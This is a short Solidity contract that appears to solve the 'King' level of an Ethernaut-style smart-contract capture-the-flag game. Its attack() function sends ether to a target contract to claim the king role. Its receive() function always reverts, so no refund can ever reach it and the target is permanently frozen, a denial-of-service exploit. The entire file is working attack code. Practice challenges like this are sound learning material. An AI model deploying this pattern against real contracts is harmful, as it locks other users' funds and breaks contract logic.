// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IKing {
    function dummy(address _owner) external;
}

contract KingHack {
    IKing public challenge;

    constructor(address challengeAddress) {
        challenge = IKing(challengeAddress);
    }

    function attack() external payable {
        (bool success, ) = payable(address(challenge)).call{value: msg.value}("");
        require(success, "External call failed");
    }

    // malicious payable fallback function
    // current King refuses to withdraw
    receive() external payable {
        require(false, "I am King forever!");
    }

}